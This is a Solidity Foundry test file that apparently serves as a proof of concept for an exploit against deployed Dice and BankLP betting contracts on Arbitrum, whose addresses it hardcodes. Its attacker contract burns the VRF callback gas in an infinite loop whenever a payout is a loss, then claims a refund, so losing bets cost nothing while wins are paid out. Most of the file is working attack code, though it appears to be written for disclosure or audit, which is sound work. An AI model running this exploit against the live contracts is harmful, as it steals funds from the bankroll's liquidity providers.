// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

interface IDiceSelectiveRefund {
    struct VRFConfig {
        address coordinator;
        bytes32 keyHash;
        uint256 subId;
        uint16 reqConfirmations;
        uint32 callbackGasLimit;
        address linkEthFeed;
    }

    struct DiceGame {
        uint256 wager;
        uint256 stopGain;
        uint256 stopLoss;
        uint256 requestID;
        address tokenAddress;
        uint64 blockNumber;
        uint32 numBets;
        uint32 multiplier;
        bool isOver;
    }

    function Dice_Play(
        uint256 wager,
        uint32 multiplier,
        address tokenAddress,
        bool isOver,
        uint32 numBets,
        uint256 stopGain,
        uint256 stopLoss
    ) external payable;

    function Dice_Refund() external;
    function Dice_GetState(address player) external view returns (DiceGame memory);
    function getRequestConfig() external view returns (VRFConfig memory);
    function refundCooldownBlocks() external view returns (uint64);
}

interface IBankLPSelectiveRefund {
    function owner() external view returns (address);
    function setWrappedAddress(address wrapped) external;
}

/// @notice A player contract that accepts profitable BankLP payouts and Dice
/// refunds, but exhausts the callback gas when BankLP offers a losing payout.
contract SelectiveRefundPlayer {
    IDiceSelectiveRefund internal immutable dice;
    address internal immutable bankroll;
    uint256 internal rejectBelow;

    constructor(address dice_, address bankroll_) {
        dice = IDiceSelectiveRefund(dice_);
        bankroll = bankroll_;
    }

    function play(uint256 wager, uint32 count) external {
        uint256 totalWager = wager * count;
        rejectBelow = totalWager;
        dice.Dice_Play{value: totalWager}(
            wager, 10_421, address(0), false, count, uint256(type(int256).max), uint256(type(int256).max)
        );
    }

    function refund() external {
        dice.Dice_Refund();
    }

    receive() external payable {
        if (msg.sender == bankroll && msg.value < rejectBelow) {
            assembly {
                for {} 1 {} {}
            }
        }
    }
}

contract MockArbSys {
    function arbBlockNumber() external view returns (uint256) {
        return block.number;
    }
}

/// @notice Standalone Arbitrum-fork reproduction against the deployed contracts.
/// It imports no Vault777 implementation code.
contract SelectiveVRFRefundPoC is Test {
    address internal constant DICE = 0x89321F592F6bc8C359Ba62F489E5e8524473931D;
    address internal constant BANK_LP = 0x138865125cb8F0Cf17fb883CCE7BBE244846ef74;
    address internal constant COORDINATOR = 0x3C0Ca683b403E37668AE3DC4FB62F4B29B6f7a3e;
    address internal constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;

    uint256 internal constant WAGER = 1e12;
    uint32 internal constant BETS = 100;
    uint256 internal constant TOTAL_WAGER = WAGER * BETS;

    function setUp() public {
        string memory rpcUrl = vm.envOr("ARBITRUM_RPC_URL", string("https://arbitrum-one.public.blastapi.io"));
        vm.createSelectFork(rpcUrl);

        vm.etch(address(0x64), address(new MockArbSys()).code);

        IDiceSelectiveRefund.VRFConfig memory config = IDiceSelectiveRefund(DICE).getRequestConfig();
        assertEq(config.coordinator, COORDINATOR, "unexpected live coordinator");
        assertEq(config.callbackGasLimit, 1_000_000, "exploit assumes the live callback limit");
        assertEq(IDiceSelectiveRefund(DICE).refundCooldownBlocks(), 20, "unexpected refund timeout");

        // function requestRandomWords(tuple req) returns (uint256 requestId)
        vm.mockCall(COORDINATOR, bytes4(0x9b1c385e), abi.encode(uint256(123)));
    }

    function testPermissionlessLiveConfigRefundsLosingFulfillment() public {
        SelectiveRefundPlayer player = _newPlayer();
        uint256 playerBefore = address(player).balance;
        uint256 bankBefore = BANK_LP.balance;

        player.play(WAGER, BETS);
        uint256 requestId = IDiceSelectiveRefund(DICE).Dice_GetState(address(player)).requestID;

        // 95 wins pay 98.9995 wagers. The receiver rejects this net loss.
        uint256[] memory words = _wordsWithWins(95);
        bool fulfilled = _fulfillWithLiveGas(requestId, words);
        assertFalse(fulfilled, "losing callback should run out of gas and revert");
        assertEq(
            IDiceSelectiveRefund(DICE).Dice_GetState(address(player)).requestID,
            requestId,
            "failed callback leaves refund-eligible request pending"
        );

        vm.roll(block.number + 20);
        player.refund();

        assertEq(address(player).balance, playerBefore, "losing batch costs the attacker nothing");
        assertEq(BANK_LP.balance, bankBefore, "failed outcome is shifted away from BankLP settlement");
        assertEq(IDiceSelectiveRefund(DICE).Dice_GetState(address(player)).requestID, 0);
    }

    function testProfitableFulfillmentIsAccepted() public {
        SelectiveRefundPlayer player = _newPlayer();
        uint256 playerBefore = address(player).balance;
        uint256 bankBefore = BANK_LP.balance;

        player.play(WAGER, BETS);
        uint256 requestId = IDiceSelectiveRefund(DICE).Dice_GetState(address(player)).requestID;

        // 96 wins pay 100.0416 wagers. The receiver accepts the profit.
        uint256[] memory words = _wordsWithWins(96);
        bool fulfilled = _fulfillWithLiveGas(requestId, words);
        assertTrue(fulfilled, "profitable callback should settle");

        uint256 expectedPayout = (WAGER * 10_421 / 10_000) * 96;
        uint256 expectedProfit = expectedPayout - TOTAL_WAGER;
        assertEq(address(player).balance - playerBefore, expectedProfit, "attacker keeps only the win");
        assertGt(bankBefore, BANK_LP.balance, "the live BankLP funds the accepted outcome");
        assertEq(IDiceSelectiveRefund(DICE).Dice_GetState(address(player)).requestID, 0);
    }

    function testConfiguredWethFallbackStillCannotSaveLosingCallback() public {
        // This owner action is defense simulation, not an attacker prerequisite.
        vm.prank(IBankLPSelectiveRefund(BANK_LP).owner());
        IBankLPSelectiveRefund(BANK_LP).setWrappedAddress(WETH);

        SelectiveRefundPlayer player = _newPlayer();
        player.play(WAGER, BETS);
        uint256 requestId = IDiceSelectiveRefund(DICE).Dice_GetState(address(player)).requestID;

        bool fulfilled = _fulfillWithLiveGas(requestId, _wordsWithWins(95));
        assertFalse(fulfilled, "EIP-150 remainder is insufficient for the WETH fallback");

        vm.roll(block.number + 20);
        uint256 beforeRefund = address(player).balance;
        player.refund();
        assertEq(address(player).balance - beforeRefund, TOTAL_WAGER);
    }

    function _newPlayer() internal returns (SelectiveRefundPlayer player) {
        player = new SelectiveRefundPlayer(DICE, BANK_LP);
        vm.deal(address(player), 1 ether);
    }

    function _wordsWithWins(uint256 wins) internal pure returns (uint256[] memory words) {
        words = new uint256[](BETS);
        for (uint256 i = wins; i < words.length; ++i) {
            words[i] = 9_700_000;
        }
    }

    function _fulfillWithLiveGas(uint256 requestId, uint256[] memory words) internal returns (bool fulfilled) {
        vm.prank(COORDINATOR);
        (fulfilled,) = DICE.call{gas: 1_000_000}(
            abi.encodeWithSignature("rawFulfillRandomWords(uint256,uint256[])", requestId, words)
        );
    }

}